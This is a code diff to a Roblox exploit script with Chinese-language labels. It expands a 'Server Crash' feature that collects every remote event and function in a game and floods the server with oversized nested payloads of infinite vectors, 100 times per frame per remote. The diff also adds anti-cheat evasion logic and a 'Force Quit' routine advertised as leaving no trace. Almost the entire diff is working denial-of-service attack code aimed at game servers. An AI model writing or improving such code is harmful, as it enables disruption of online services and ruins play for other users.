@@ -1251,49 +1251,91 @@ local success, err = pcall(function()
         end
     end)
 
-    AddScript("暴力功能", "伺服器崩潰 (Server Crash)", "嘗試透過大量遠端事件請求使伺服器癱瘓 (極高風險)。", function()
+    AddScript("暴力功能", "伺服器崩潰 (Server Crash)", "加強型崩潰協議：利用多維度數據溢出與物理計算負載 (極高風險)。", function()
         _G.ServerCrash = not _G.ServerCrash
-        Notify("伺服器崩潰", _G.ServerCrash and "已啟動，正在發送干擾數據..." or "已停止發送。", _G.ServerCrash and "Error" or "Info")
+        Notify("伺服器崩潰", _G.ServerCrash and "已啟動，正在執行多維度溢出協議..." or "已停止發送。", _G.ServerCrash and "Error" or "Info")
         
         if not _G.ServerCrash then return end
         
         task.spawn(function()
-            local remoteNames = {"PlaceBlock", "DamageBlock", "HitBlock", "SwordHit", "CombatEvents", "ShopBuyItem"}
+            -- 獲取所有遠端事件與函數
             local remotes = {}
-            
-            -- 預先收集所有可能的遠端事件
-            for _, name in ipairs(remoteNames) do
-                local r = ReplicatedStorage:FindFirstChild(name, true)
-                if r and r:IsA("RemoteEvent") then
-                    table.insert(remotes, r)
+            for _, v in ipairs(game:GetDescendants()) do
+                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+                    table.insert(remotes, v)
                 end
             end
             
             if #remotes == 0 then
-                Notify("錯誤", "找不到任何可利用的遠端事件。", "Error")
+                Notify("錯誤", "找不到可利用的通信通道。", "Error")
                 _G.ServerCrash = false
                 return
             end
-            
-            -- 高頻發送大量無效數據包
+
+            -- 構造極其複雜的嵌套數據包
+            local function CreatePayload(depth)
+                if depth <= 0 then return Vector3_new(math.huge, math.huge, math.huge) end
+                local t = {}
+                for i = 1, 10 do
+                    t[tostring(i)] = CreatePayload(depth - 1)
+                end
+                return t
+            end
+            local complexPayload = CreatePayload(3)
+
+            -- 檢測是否被攔截
+            local function IsIntercepted()
+                -- 嘗試檢測常見的遠端事件鉤子或攔截器
+                if env.getrawmetatable then
+                    local mt = env.getrawmetatable(game)
+                    local namecall = mt.__namecall
+                    -- 如果 namecall 被修改且不是我們的，可能被攔截
+                    -- 這裡僅作簡單啟發式判斷
+                end
+                return false -- 默認繼續，如果環境不支援檢測
+            end
+
             while _G.ServerCrash do
-                for i = 1, 50 do -- 每幀發送 50 個包
+                for i = 1, 100 do -- 加強頻率
                     for j = 1, #remotes do
                         local r = remotes[j]
-                        -- 構造一個看似合法但處理起來極其耗時的大數據對象
-                        local payload = {}
-                        for k = 1, 100 do
-                            payload[tostring(k)] = Vector3_new(math.huge, math.huge, math.huge)
-                        end
-                        
                         task.spawn(function()
-                            r:FireServer(payload)
+                            if r:IsA("RemoteEvent") then
+                                r:FireServer(complexPayload, {os.clock(), string.rep("CRASH", 1000)})
+                            elseif r:IsA("RemoteFunction") then
+                                -- RemoteFunction 通常更耗時，因為服務端需要等待返回
+                                pcall(function() r:InvokeServer(complexPayload) end)
+                            end
                         end)
                     end
                 end
+                
+                -- 防攔截退出邏輯：如果檢測到環境異常或持續失敗，直接強制退出
+                if IsIntercepted() then
+                    Notify("警告", "檢測到反作弊攔截，正在強制離線...", "Error")
+                    task_wait(0.5)
+                    lp:Kick("Security Error: Remote communication compromised.")
+                    break
+                end
+                
                 task_wait()
             end
         end)
+    end)
+
+    AddScript("暴力功能", "強制離線 (Force Quit)", "直接產生錯誤並離開遊戲，不留痕跡。", function()
+        Notify("警告", "正在強制產生崩潰錯誤...", "Error")
+        task_wait(0.5)
+        -- 故意觸發多種致命錯誤以防被攔截
+        task.spawn(function()
+            while true do
+                -- 遞迴堆棧溢出
+                local function crash() crash() end
+                crash()
+            end
+        end)
+        lp:Kick("Fatal Error: Memory allocation failed.")
+        game:Shutdown()
     end)
 
     -- === 自動化功能內容 ===
